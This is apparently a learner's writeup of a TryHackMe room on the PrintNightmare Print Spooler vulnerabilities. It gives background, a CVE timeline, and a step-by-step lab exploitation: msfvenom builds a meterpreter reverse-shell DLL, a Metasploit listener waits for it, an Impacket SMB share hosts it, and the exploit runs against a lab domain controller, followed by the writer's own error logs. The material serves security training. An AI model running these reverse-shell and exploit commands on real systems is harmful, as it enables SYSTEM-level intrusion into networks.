---
Learn about the vulnerability known as PrintNightmare (CVE-2021-1675) and (CVE-2021-34527).
---

# PrintNightmare — Writeup

## Overview
### PrintNightmare — Writeup
### PrintNightmare — Writeup
![](https://assets.tryhackme.com/additional/printnightmare/pm-room-banner1.png)
![|222](https://tryhackme-images.s3.amazonaws.com/room-icons/01c0ff183a9d9767f90b03ca14b9a24d.png)
### Introduction
This room will cover the Printnightmare vulnerability from a offensive and defensive perspective.
Per Microsoft, "A remote code execution vulnerability exists when the Windows Print Spooler service improperly performs privileged file operations. An attacker who successfully exploited this vulnerability could run arbitrary code with SYSTEM privileges. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights".
Learning Objectives: In this room, you will learn what PrintNightmare vulnerability is, how to exploit and mitigate it. You will also learn the detection mechanisms using Windows Event Logs and Wireshark.
Outcome: As a result, you will be ready to defend your organization against any potential PrintNightmare attacks.
Learning Pre-requisites: You should be familiar with Wireshark, Windows Event Logs, Linux Fundamentals, and Meterpreter prior to joining this room.
### Windows Print Spooler Service
![](https://i.ibb.co/GM5RPFc/printspool.png)
Microsoft defines the [Print spooler service](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc) as a service that runs on each computer system. As you can guess from the name, the Print spooler service manages the printing processes. The Print spooler's responsibilities are managing the print jobs, receiving files to be printed, queueing them, and scheduling.
You are able to Start/Stop/Pause/Resume the Print Spooler Service by simply navigating to Services on your Windows system.
Services:
![](https://i.ibb.co/RT53ySK/spooleerr.png)
https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/b1e6690e-453a-4415-9506-2706ba31feac#gt_12a6e569-e97c-4761-92f0-e397f8d5125f
print spooler: The component is a service that implements the Print Services system on Windows-based print clients and print servers. The spooler buffers and orders print jobs and converts print job data to printer-specific formats.
Print Spooler Properties (Services):
![](https://i.ibb.co/3WPvSJY/print.png)
Print spooler service makes sure to provide enough resources to the computers that send out the print jobs. Remember the early days when users had to wait for print jobs to finish to perform other operations? Well, the Print spooler service took care of this issue for us.
The Print spooler service allows the systems to act as print clients, administrative clients, or print servers. It is also important to note that the Print spooler service is enabled by default in all Windows clients and servers. It's necessary to have a Print spooler service on the computer to connect to a printer. There are third-party software and drivers provided by the printer manufacturers that would not require you to have the Print spooler service enabled. Still, most companies prefer to utilize Print spooler services.
Domain Controllers mainly use Print spooler service for printer pruning (the process of removing the printers that are not in use anymore on the network and have been added as objects to Active Directory). Printer pruning eliminates the issue for the users reaching out to a non-existent printer.  You will know soon why we mentioned Domain Controllers.
Where would you enable or disable Print Spooler Service?
*Services*

## Exploitation
![|222](https://i.ibb.co/n66nMM9/tuxpi-com-1629004074.jpg)
To better understand the PrintNightmare vulnerability (or any vulnerability), you should get into the habit of researching the vulnerabilities by reading Microsoft articles on any Windows-specific CVE or browsing through the Internet for community and vendor blogposts.
There has been some confusion if the [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675) and [CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) are related to each other. They go under the same name: Windows Print Spooler Remote Code Execution Vulnerability and are both related to the Print Spooler.
As Microsoft states in the FAQ, the PrintNightmare (CVE-2021-34527) vulnerability "is similar but distinct from the vulnerability that is assigned CVE-2021-1675. The attack vector is different as well."
What did Microsoft mean by the attack vector? To answer this question, let's look into the differences between the two vulnerabilities and append the timeline of events.
Per Microsoft's definition, PrintNightmare vulnerability is "a remote code execution vulnerability exists when the Windows Print Spooler service improperly performs privileged file operations. An attacker who successfully exploited this vulnerability could run arbitrary code with SYSTEM privileges. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.".
Running arbitrary code involves executing any commands of the attacker's choice and preference on a victim's machine.
Suppose you had a chance to look at both CVE's on Microsoft. You would notice that the attack vectors for both are different.
To exploit the CVE-2021-1675 vulnerability, the attacker would need to have direct or local access to the machine to use a malicious DLL file to escalate privileges. To exploit the CVE-2021-34527 vulnerability successfully, the attacker can remotely inject the malicious DLL file.
Vulnerability metrics for CVE-2021-1675:
```text
PS C:\Users\User> Get-Service -Name Spooler

Status   Name               DisplayName
------   ----               -----------
Running  Spooler            Print Spooler
```
![](https://i.ibb.co/fd1m86s/spooleerr1.png)
Vulnerability metrics for CVE-2021-34527:
![](https://i.ibb.co/tKZMCXB/34527.png)
Timeline:
June 8, 2021: Microsoft issued a patch for a privilege escalation vulnerability in the print spooler service (CVE-2021-1675).
June 21, 2021: Microsoft revised the vulnerability and changed its classification to remote code execution (RCE).
June 27, 2021: Chinese cybersecurity firm [QiAnXin](https://ti.qianxin.com/) published a [video](https://twitter.com/RedDrip7/status/1409353110187757575) demonstrating local privilege escalation (LPE) and RCE.
July 2, 2021: Microsoft assigns a new CVE so-called PrintNightmare vulnerability in the print spooler service (CVE-2021-34527).
July 6, 2021: Microsoft released an out-of-band patch (a patch released at some time other than the normal release time) to address CVE-2021-34527 and provides additional workarounds to defend against the exploit.
What makes PrintNightmare dangerous?
It can be exploited over the network; the attacker doesn't need direct access to the machine.
The proof-of-concept was made public on the Internet. https://github.com/cube0x0/CVE-2021-1675
The Print Spooler service is enabled by DEFAULT on domain controllers and computers with SYSTEM privileges.
Provide the CVE of the Windows Print Spooler Remote Code Execution Vulnerability that doesn't require local access to the machine.
*CVE-2021-34527*
https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/view#gid=1190662839
What date was the CVE assigned for the vulnerability in the previous question? (mm/dd/yyyy)
*07/02/2021*
### Try it yourself!
To understand how the attack works and what logs and events are generated, you need to put the Black Hat on and run the attack on your own. But, of course, it requires permission from management to perform this attack in your employer's environment, even if it's an isolated environment.
Fret not, you can perform the attack against the attached virtual machine and not in your employer's environment.
Start the attached virtual machine. After a few minutes, your machine's IP should be: 10.10.118.174
Follow the steps outlined below to exploit the Domain Controller using the Attack Box by exploiting the PrintNightmare vulnerability.
In the sample terminal output below, the victim is 192.168.0.200, and the attacker is 192.168.0.100.
Note: As a subscriber, launch the Attack Box if you haven't done so before proceeding. As a free user, this task should be completed on your local attacking machine. As a free user, you can skip these uninstall steps and jump to installing the Impacket and the exploit.
First, let's clean up the Attack Box before downloading the necessary components for the PrintNightmare exploit.
This is necessary because some pre-installed components in the Attack Box will prevent the successful execution of the exploit.
Uninstall Impacket:
```text
Uninstall Impacket

           
root@attackbox:~# pip uninstall impacket
Found existing installation: impacket 0.9.21
Uninstalling impacket-0.9.21:
  Would remove:
	[...]
Proceed (y/n)? y
  Successfully uninstalled impacket-0.9.21
```
Uninstall pyasn1:
```text
Uninstall pyasn1

           
root@attackbox:~# pip uninstall pyasn1
Found existing installation: pyasn1 0.4.2
Uninstalling pyasn1-0.4.2:
  Would remove:
    /usr/lib/python3/dist-packages/pyasn1
    /usr/lib/python3/dist-packages/pyasn1-0.4.2.egg-info
Proceed (y/n)? y
  Successfully uninstalled pyasn1-0.4.2
```
Re-install pyasn1 (version > 0.4.2):
```text
Re-install pyasn1

           
root@attackbox:~# pip install pyasn1
Collecting pyasn1
  Downloading pyasn1-0.4.8-py2.py3-none-any.whl (77 kB)
Installing collected packages: pyasn1
Successfully installed pyasn1-0.4.8
```
Now you should be ready to download the [exploit](https://github.com/tryhackme/CVE-2021-1675) and [Impacket](https://github.com/tryhackme/impacket) to the Attack Box from the TryHackMe GitHub repo.
Before proceeding, create 2 directories on the Desktop:
pn - this will contain the exploit and impacket.
share - this directory (/root/Desktop/share) will contain the malicious DLL that will be created with msfvenom.
Download CVE-2021-1675.py:
```text
Clone CVE-2021-1675 exploit from GitHub

root@attackbox:~/Desktop/pn# git clone https://github.com/tryhackme/CVE-2021-1675.git 
Cloning into 'CVE-2021-1675'...
remote: Enumerating objects: 173, done.
remote: Counting objects: 100% (173/173), done.
remote: Compressing objects: 100% (105/105), done.
remote: Total 173 (delta 62), reused 133 (delta 36), pack-reused 0
Receiving objects: 100% (173/173), 1.45 MiB | 452.00 KiB/s, done.
Resolving deltas: 100% (62/62), done.
```
Download & install Impacket:
```text
Clone Impacket from GitHub

root@attackbox:~/Desktop/pn# git clone https://github.com/tryhackme/impacket.git 
Cloning into 'impacket'...
remote: Enumerating objects: 19570, done.
remote: Total 19570 (delta 0), reused 0 (delta 0), pack-reused 19570
Receiving objects: 100% (19570/19570), 6.57 MiB | 8.88 MiB/s, done.
Resolving deltas: 100% (14896/14896), done.
```
Next, navigate to the impacket directory and install Impacket.
```text
Install Impacket

root@attackbox:~/Desktop/pn/impacket# python setup.py install 
... 
Finished processing dependencies for impacket==0.9.24.dev1+20210704.162046.29ad5792
```
If you see a similar message to the one above, then you're golden. Before spinning up Metasploit, create the malicious DLL.
Note: In the terminal outputs below the victim is 192.168.0.200 and the attacker is 192.168.0.100.  You will need to replace 192.168.0.100 with your ATTACK BOX IP (or OpenVPN IP) and 192.168.0.200 with the victim 10.10.118.174.
You will use msfvenom to create the malicious DLL.
```text
Create malicious DLL with Msfvenom

root@attackbox:~/Desktop/pn# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f dll -o ~/Desktop/share/malicious.dll 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of dll file: 5120 bytes
Saved as: /root/Desktop/share/malicious.dll
```
If you see a similar output when you run this command, then you should have successfully created the DLL.
Let's fire up Metasploit.
```text
Launch Metasploit

root@attackbox:~/Desktop/pn# msfconsole 
=[ metasploit v5.0.101-dev                         ]
+ -- --=[ 2048 exploits - 1105 auxiliary - 344 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: To save all commands executed since start up to a file, use the makerc command

msf5 >
```
Once Metasploit successfully loads, you need to configure the handler to receive the incoming connection from the malicious DLL.
Run the following commands options:
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost VALUE
set lport VALUE
Note: The value for LHOST and LPORT must be the same values you used to create the malicious DLL.
```text
Configure a Metasploit listener

msf5 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost 192.168.0.100
lhost => 192.168.0.100 msf5 exploit(multi/handler) > set lport 4444
lport => 4444
msf5 exploit(multi/handler) >
```
Next, run it so it will be actively waiting for a connection.
```text
Start the listener to accept incoming connections

msf5 exploit(multi/handler) > run -j 
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP on 192.168.0.100:4444
```
The -j simply means to run it as a job.
```text
Check the Metasploit Job status

msf5 exploit(multi/handler) > jobs

Jobs
====

  Id  Name                    Payload                              Payload opts
  --  ----                    -------                              ------------
  0   Exploit: multi/handler  windows/x64/meterpreter/reverse_tcp  tcp://192.168.0.100:4444

msf5 exploit(multi/handler) >
```
Great, now you'll need to host the malicious DLL in a SMB share running on the attacker box. We'll use the AttackBox in this example.
Below is how to do this with smbserver.py from Impacket.
```text
Start the SMB share with Impacket to host the malicious DLL

root@attackbox:~/Desktop/pn# smbserver.py share /root/Desktop/share/ -smb2support 
Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
A brief explanation for the command in the above image:
This is the name of the SMB share for the exploit execution. (Example: \\ATTACKER_IP\share\malicious.dll)
This is the local folder that will store the malicious DLL. (Example: /root/Desktop/share/malicious.dll)
Before we blindly just execute an exploit at the target, let's first examine if the target fits the criteria to exploit it.
```text
Check if the target is vulnerable to this exploit

root@attackbox:~/Desktop/pn# rpcdump.py @10.10.118.174 | egrep 'MS-RPRN|MS-PAR' 
Protocol: [MS-RPRN]: Print System Remote Protocol 
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
```
Yep, looks good. It's finally time to run the exploit. Navigate to the location where you downloaded the exploit code from GitHub, which should be /root/Desktop/pn/CVE-2021-1675.
We will use the Python script to exploit the PrintNightmare vulnerability against the Windows 2019 Domain Controller.
```text
Check if the target is vulnerable to this exploit

root@attackbox:~/Desktop/pn# rpcdump.py @10.10.118.174 | egrep 'MS-RPRN|MS-PAR' 
Protocol: [MS-RPRN]: Print System Remote Protocol 
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
```
Yep, looks good. It's finally time to run the exploit. Navigate to the location where you downloaded the exploit code from GitHub, which should be /root/Desktop/pn/CVE-2021-1675.
We will use the Python script to exploit the PrintNightmare vulnerability against the Windows 2019 Domain Controller.
```text
Exploit code syntax

root@attackbox:~/Desktop/pn/CVE-2021-1675# python CVE-2021-1675.py Finance-01.THMdepartment.local/sjohnston:mindheartbeauty76@10.10.118.174 '\\192.168.0.100\share\malicious.dll'
```
A brief explanation for the command in the above image:
python CVE-2021-1675.py -> you're instructing Python to run the following Python script. The values which follow are the parameters the script needs to exploit the PrintNightmare vulnerability successfully.
Finance-01.THMdepartment.local -> the name of the domain controller (Finance-01) along with the name of the domain (THMdepartment.local)
sjohnston:mindheartbeauty76@10.10.118.174 -> the username and password for the low privilege Windows user account.
\\ATTACKER_IP_ADDRESS\share\malicious.dll -> the location to the SMB path storing the malicious DLL.
If all goes well, you should see an output similar to the below image.
```text
Run the exploit

root@attackbox:~/Desktop/pn/CVE-2021-1675# python CVE-2021-1675.py Finance-01.THMdepartment.local/sjohnston:mindheartbeauty76@10.10.118.174 '\\192.168.0.100\share\malicious.dll'
[*] Connecting to ncacn_np:10.10.118.174[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL
[*] Executing \??\UNC\192.168.0.100\share\malicious.dll
[*] Try 1...
[*] Stage0: 0
[*] Try 2...
[*] Stage0: 0
[*] Try 3...
[*] Stage0: 0
```
You may see Python errors after Try 3... but they are safe to ignore.
On the attacker box, you should see the SMB connection calling for the malicious DLL file.
```text
Victim connects to the SMB share for the malicious DLL

root@attackbox:~/Desktop/pn# ...
[*] Incoming connection (10.10.118.174,55037)
[*] AUTHENTICATE_MESSAGE (\,FINANCE-01)
[*] User FINANCE-01\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:share)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:share)
[*] Closing down connection (10.10.210.90,55037)
[*] Remaining connections []
```
Lastly, you will have a successful Meterpreter session.
```text
Incoming connection received

msf5 exploit(multi/handler) > [*] Sending stage (201283 bytes) to 10.10.118.174 [*] Meterpreter session 1 opened (192.168.0.100:4444 -> MACHINE_IP:55038) at 2021-08-17 17:56:31 +0100
```
```text
┌──(root㉿kali)-[~/Desktop/pn/CVE-2021-1675]
└─# python CVE-2021-1675.py Finance-01.THMdepartment.local/sjohnston:mindheartbeauty76@10.10.150.198 '\\10.13.0.182\share\malicious.dll'
[*] Connecting to ncacn_np:10.10.150.198[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL
[*] Executing \??\UNC\10.13.0.182\share\malicious.dll
[*] Try 1...
Traceback (most recent call last):
  File "/root/Desktop/pn/CVE-2021-1675/CVE-2021-1675.py", line 188, in <module>
    main(dce, pDriverPath, options.share)
  File "/root/Desktop/pn/CVE-2021-1675/CVE-2021-1675.py", line 93, in main
    resp = rprn.hRpcAddPrinterDriverEx(dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)
  File "/usr/local/lib/python3.10/dist-packages/impacket-0.9.24.dev1+20210704.162046.29ad5792-py3.10.egg/impacket/dcerpc/v5/rprn.py", line 633, in hRpcAddPrinterDriverEx
    return dce.request(request)
  File "/usr/local/lib/python3.10/dist-packages/impacket-0.9.24.dev1+20210704.162046.29ad5792-py3.10.egg/impacket/dcerpc/v5/rpcrt.py", line 878, in request
    raise exception
impacket.dcerpc.v5.rprn.DCERPCSessionError: RPRN SessionError: code: 0x35 - ERROR_BAD_NETPATH - The network path was not found.

giv me some error 

now works for me, iptables was denying traffic

┌──(root㉿kali)-[~/home/witty/Desktop/impacket]
└─# rpcdump.py @10.10.66.59 | egrep 'MS-RPRN|MS-PAR' 
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol 

┌──(root㉿kali)-[~/home/witty/Desktop/CVE-2021-1675]
└─# python CVE-2021-1675.py Finance-01.THMdepartment.local/sjohnston:mindheartbeauty76@10.10.66.59 '\\10.8.19.103\share\malicious.dll'
[*] Connecting to ncacn_np:10.10.66.59[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL
[*] Executing \??\UNC\10.8.19.103\share\malicious.dll
[*] Try 1...
[*] Stage0: 0
[*] Try 2...
[*] Stage0: 0
[*] Try 3...
Traceback (most recent call last):
  File "/usr/local/lib/python3.10/dist-packages/impacket-0.9.24.dev1+20210704.162046.29ad5792-py3.10.egg/impacket/smbconnection.py", line 568, in writeFile
    return self._SMBConnection.writeFile(treeId, fileId, data, offset)
  File "/usr/local/lib/python3.10/dist-packages/impacket-0.9.24.dev1+20210704.162046.29ad5792-py3.10.egg/impacket/smb3.py", line 1650, in writeFile
    written = self.write(treeId, fileId, writeData, writeOffset, len(writeData))
  File "/usr/local/lib/python3.10/dist-packages/impacket-0.9.24.dev1+20210704.162046.29ad5792-py3.10.egg/impacket/smb3.py", line 1358, in write
    if ans.isValidAnswer(STATUS_SUCCESS):
  File "/usr/local/lib/python3.10/dist-packages/impacket-0.9.24.dev1+20210704.162046.29ad5792-py3.10.egg/impacket/smb3structs.py", line 454, in isValidAnswer
    raise smb3.SessionError(self['Status'], self)
impacket.smb3.SessionError: SMB SessionError: STATUS_PIPE_CLOSING(The specified named pipe is in the closing state.)

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/root/home/witty/Desktop/CVE-2021-1675/CVE-2021-1675.py", line 192, in <module>
    main(dce, pDriverPath, options.share)
  File "/root/home/witty/Desktop/CVE-2021-1675/CVE-2021-1675.py", line 93, in main
    resp = rprn.hRpcAddPrinterDriverEx(dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)
  File "/usr/local/lib/python3.10/dist-packages/impacket-0.9.24.dev1+20210704.162046.29ad5792-py3.10.egg/impacket/dcerpc/v5/rprn.py", line 633, in hRpcAddPrinterDriverEx
    return dce.request(request)
  File "/usr/local/lib/python3.10/dist-packages/impacket-0.9.24.dev1+20210704.162046.29ad5792-py3.10.egg/impacket/dcerpc/v5/rpcrt.py", line 856, in request
    self.call(request.opnum, request, uuid)
  File "/usr/local/lib/python3.10/dist-packages/impacket-0.9.24.dev1+20210704.162046.29ad5792-py3.10.egg/impacket/dcerpc/v5/rpcrt.py", line 845, in call
    return self.send(DCERPC_RawCall(function, body.getData(), uuid))
  File "/usr/local/lib/python3.10/dist-packages/impacket-0.9.24.dev1+20210704.162046.29ad5792-py3.10.egg/impacket/dcerpc/v5/rpcrt.py", line 1298, in send
    self._transport_send(data)
  File "/usr/local/lib/python3.10/dist-packages/impacket-0.9.24.dev1+20210704.162046.29ad5792-py3.10.egg/impacket/dcerpc/v5/rpcrt.py", line 1235, in _transport_send
    self._transport.send(rpc_packet.get_packet(), forceWriteAndx = forceWriteAndx, forceRecv = forceRecv)
  File "/usr/local/lib/python3.10/dist-packages/impacket-0.9.24.dev1+20210704.162046.29ad5792-py3.10.egg/impacket/dcerpc/v5/transport.py", line 535, in send
    self.__smb_connection.writeFile(self.__tid, self.__handle, data)
  File "/usr/local/lib/python3.10/dist-packages/impacket-0.9.24.dev1+20210704.162046.29ad5792-py3.10.egg/impacket/smbconnection.py", line 570, in writeFile
    raise SessionError(e.get_error_code(), e.get_error_packet())
impacket.smbconnection.SessionError: SMB SessionError: STATUS_PIPE_CLOSING(The specified named pipe is in the closing state.)

┌──(root㉿kali)-[~/home/witty/Desktop/impacket]
└─# smbserver.py share /root/Desktop/share/ -smb2support 
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.66.59,58277)
[*] AUTHENTICATE_MESSAGE (\,FINANCE-01)
[*] User FINANCE-01\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:share)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:share)
[*] Closing down connection (10.10.66.59,58277)
[*] Remaining connections []

┌──(root㉿kali)-[~]
└─# ls
bettercap.history  Desktop  home  wittyAle
                                                                                                             
┌──(root㉿kali)-[~]
└─# msfconsole                
                                                  

 ______________________________________________________________________________
|                                                                              |
|                   METASPLOIT CYBER MISSILE COMMAND V5                        |
|______________________________________________________________________________|
      \                                  /                      /
       \     .                          /                      /            x
        \                              /                      /
         \                            /          +           /
          \            +             /                      /
           *                        /                      /
                                   /      .               /
    X                             /                      /            X
                                 /                     ###
                                /                     # % #
                               /                       ###
                      .       /
     .                       /      .            *           .
                            /
                           *
                  +                       *

                                       ^
####      __     __     __          #######         __     __     __        ####
####    /    \ /    \ /    \      ###########     /    \ /    \ /    \      ####
################################################################################
################################################################################
```
```text
# WAVE 5 ######## SCORE 31337 ################################## HIGH FFFFFFFF #
################################################################################
                                                           https://metasploit.com

       =[ metasploit v6.2.25-dev                          ]
+ -- --=[ 2264 exploits - 1189 auxiliary - 404 post       ]
+ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Writing a custom module? After editing your 
module, why not try the reload command
Metasploit Documentation: https://docs.metasploit.com/
```
```text
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
```
```text
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
